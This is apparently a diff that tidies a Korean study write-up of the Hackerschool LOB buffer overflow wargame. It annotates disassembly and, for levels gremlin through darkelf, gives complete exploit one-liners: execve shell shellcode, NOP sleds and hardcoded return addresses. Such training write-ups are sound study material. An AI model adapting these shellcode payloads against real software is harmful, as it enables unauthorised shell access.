@@ -28,11 +28,11 @@ Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제
 
 0x8048433 <main+3>:     sub    %esp,0x100 // 스택영역 100바이트 할당
 
-0x8048439 <main+9>:     cmp    DWORD PTR [%ebp+8],1 // [ebp+8]은 첫번째 argument이므로 argc
+0x8048439 <main+9>:     cmp    DWORD PTR [%ebp+8],1 // [ebp+8]은 첫번째 argument이므로 argc
 0x804843d <main+13>:    jg     0x8048456 <main+38>  // if(argc <=1) 
 
 0x804843f <main+15>:    push   0x80484e0
-0x8048444 <main+20>:    call   0x8048350 <printf> // printf( "argv error\n"); 
+0x8048444 <main+20>:    call   0x8048350 <printf> // printf( "argv error\n");
 0x8048449 <main+25>:    add    %esp,4 // 함수리턴
 
 0x804844c <main+28>:    push   0  // 아래 함수의 argument
@@ -50,7 +50,7 @@ Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제
 
 0x804846e <main+62>:    lea    %eax,[%ebp-256]  // &buffer[0]
 0x8048474 <main+68>:    push   %eax // &buffer[0]
-0x8048475 <main+69>:    push   0x80484ec  // "%s\n"
+0x8048475 <main+69>:    push   0x80484ec  // "%s\n"
 0x804847a <main+74>:    call   0x8048350 <printf> // printf(""%s\n",buffer)
 0x804847f <main+79>:    add    %esp,8 // 함수리턴
 
@@ -58,20 +58,22 @@ Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제
 0x8048483 <main+83>:    ret
 ```
 
+#### 문제풀이
+
 1. 제약조건은 arg가 2개 이상이기만 하면 되므로 사용할 수 있는 공간이 많다. 가장 기본인 stack 메모리의 시작주소를 return주소로 정하였다.
   - 셸코드 크기: 25바이트
   - "\x90"235만큼 채우면 된다.
   - `r $(perl -e 'print "SHELL CODE" . "\x90"x235 . "\x78\xf9\xff\xbf"')
   - SHELL CODE 시작될 주소: `bf-ff-f9-78`
   - "SHELL CODE"
-  ```
-  \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
-  ```
+    ```
+    \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
+    ```
   - arg를 하나 더 추가해서 풀 수도 있음
-  ```
-  x/20s $ebp-3000
-  bffff6d9
-  ```
+    ```
+    x/20s $ebp-3000
+    bffff6d9
+    ```
 
 ### (02) LEVEL2: gremlin / hello bof world
 - COBOLT 
@@ -80,12 +82,12 @@ Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제
 0x8048430  <main>:       push   %ebp   
 0x8048431  <main+1>:     mov    %ebp,%esp // 프롤로그
 
-0x8048433 <main+3>:     sub     %esp,16 // 스택영역 16바이트 할당
+0x8048433  <main+3>:     sub    %esp,16 // 스택영역 16바이트 할당
 
-0x8048436 <main+6>:     cmp     DWORD PTR [%ebp+8],1  // [ebp+8]은 첫번째 argument이므로 argc 
+0x8048436  <main+6>:     cmp    DWORD PTR [%ebp+8],1  // [ebp+8]은 첫번째 argument이므로 argc
 0x804843a  <main+10>:    jg     0x8048453  <main+35>  // if(argc <=1)
 
-0x804843c <main+12>:    push    0x80484d0   
+0x804843c  <main+12>:    push   0x80484d0   
 0x8048441  <main+17>:    call   0x8048350  <printf> // printf( "argv error\n")
 0x8048446  <main+22>:    add    %esp,4  //  함수리턴
 
@@ -93,25 +95,27 @@ Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제
 0x804844b  <main+27>:    call   0x8048360  <exit> // exit(0)
 0x8048450  <main+32>:    add    %esp,4  // 함수리턴
 
-0x8048453 <main+35>:    mov     %eax,DWORD PTR [%ebp+12]  // [ebp+12]는 두번째 argument이므로 *argv[0]
+0x8048453  <main+35>:    mov    %eax,DWORD PTR [%ebp+12]  // [ebp+12]는 두번째 argument이므로 *argv[0]
 0x8048456  <main+38>:    add    %eax,4  // argv[1]
 
-0x8048459 <main+41>:    mov     %edx,DWORD PTR [%eax]// strcpy의  두번째 argument
+0x8048459  <main+41>:    mov    %edx,DWORD PTR [%eax]// strcpy의  두번째 argument
 0x804845b  <main+43>:    push   %edx   
-0x804845c <main+44>:     lea    %eax,[%ebp-16]  //strcpy의 첫번재 argument &buffer[0]
+0x804845c  <main+44>:    lea    %eax,[%ebp-16]  //strcpy의 첫번재 argument &buffer[0]
 0x804845f  <main+47>:    push   %eax   
-0x8048460 <main+48>:     call   0x8048370 <strcpy> // strcpy(buffer,argv[1]);
+0x8048460  <main+48>:    call   0x8048370 <strcpy> // strcpy(buffer,argv[1]);
 0x8048465  <main+53>:    add    %esp,8
 
-0x8048468 <main+56>:    lea     %eax,[%ebp-16]   
+0x8048468  <main+56>:    lea    %eax,[%ebp-16]   
 0x804846b  <main+59>:    push   %eax   
 0x804846c  <main+60>:    push   0x80484dc // "%s\n"
 0x8048471  <main+65>:    call   0x8048350  <printf>   
 0x8048476  <main+70>:    add    %esp,8  // printf(""%s\n",buffer);
 
-0x8048479 <main+73>:    leave   
+0x8048479  <main+73>:    leave   
 0x804847a  <main+74>:    ret  // 함수리턴
 ```
+
+#### 문제풀이
 
 1. 셸코드 25바이트. 스택메모리 16바이트. 셸코드를 어디에 업로드??
 ```
@@ -194,89 +198,57 @@ nop코드 있는 어떤 곳 중의 주소만 입력해도 그 뒤에 있는 셸�
 ```
 
 ### (03) LEVEL3. cobolt / hacking exposed
-GOBLIN 
+- GOBLIN
 
-gets로 입력받음.
+#### 문제풀이
+- gets로 입력받음
+- 셸코드를 미리 입력해두고 파이프라인을 통해 텍스트 넘겨주고 실행시킴 (표준 출력->표준입력으로 넘겨줌)
+- 뒤에 ;cat을 추가해서 넘겨주면 정확하게 값이 넘어간다.
 
- 셸코드를
+1. bash2로 변경
+2. 환경변수 등록(export~)
+```
+export hack=$(perl -e 'print "\x90"x10000 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
+```
+3. perl 작성 (perl -e 'print "a"x20 . "\xe2\xfb\xff\xbf"';cat)|./goblin
 
-미리 입력해두고 파이프라인을 통해 텍스트 넘겨주고 실행시킴.(표준 출력->표준입력으로 넘겨줌)
+### (04) LEVEL4. id: goblin // pw: hackers proof
+- ORC
 
- 뒤에
+#### 문제풀이
+1. argc<=1
+2. memset environ(환경변수)
+3. argv1=="\xbf";
+```
+r $(perl -e 'print "\x90"x19 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" . "\xd0\xfa\xff\xbf"')
+```
+==> 리턴주소가 argv[1]을 가리키도록
+==> 매개변수 2개로 풀어도 된다.
 
-;cat을 추가해서 넘겨주면 정확하게 값이 넘어감.
+### (05) LEVEL5: orc / cantata
+- WOLFMAN 
 
- 1. bash2로 변경
+#### 문제풀이
+1. argc<=1
+2. memset environ(환경변수)
+3. argv1=="\xbf"
+4. memset buffer
+```
+./wolfman $(perl -e 'print "\x90"x19 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" . "\x64\xfc\xff\xbf"')
+```
 
- 2. 환경변수
+### (06) LEVEL6: wolfman / love eyuna
+- DARKELF 
 
-등록(export~)
-
- export hack=$(perl -e 'print
-
-"\x90"x10000 .
-
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
-
- 3. perl 작성 (perl -e 'print "a"x20 .
-
-"\xe2\xfb\xff\xbf"';cat)|./goblin
-
-ORC 
-
-\1. argc<=1
-
-\2. memset environ(환경변수)
-
-\3. argv1=="\xbf";
-
-r $(perl -e 'print "\x90"x19 .
-
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
-
-. "\xd0\xfa\xff\xbf"')
-
- ==>리턴주소가
-
-argv[1]을 가리키게.
-
- ==>매개변수
-
-2개로 풀어도 됨.
-
-WOLFMAN 
-
-\1. argc<=1
-
-\2. memset environ(환경변수)
-
-\3. argv1=="\xbf"
-
-\4. memset buffer
-
-./wolfman $(perl -e 'print "\x90"x19 .
-
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
-
-. "\x64\xfc\xff\xbf"')
-
-DARKELF 
-
-\1. argc<=1
-
-\2. memset environ(환경변수)
-
-\3. argv1=="\xbf"
-
-\4. argv[1]<=48
-
-\5. memset buffer
-
-./darkelf $(perl -e 'print "\x90"x19 .
-
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
-
-. "\x44\xfc\xff\xbf"')
+#### 문제풀이
+1. argc<=1
+2. memset environ(환경변수)
+3. argv1=="\xbf"
+4. argv[1]<=48
+5. memset buffer
+```
+./darkelf $(perl -e 'print "\x90"x19 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" . "\x44\xfc\xff\xbf"')
+```
 
 ORGE
 
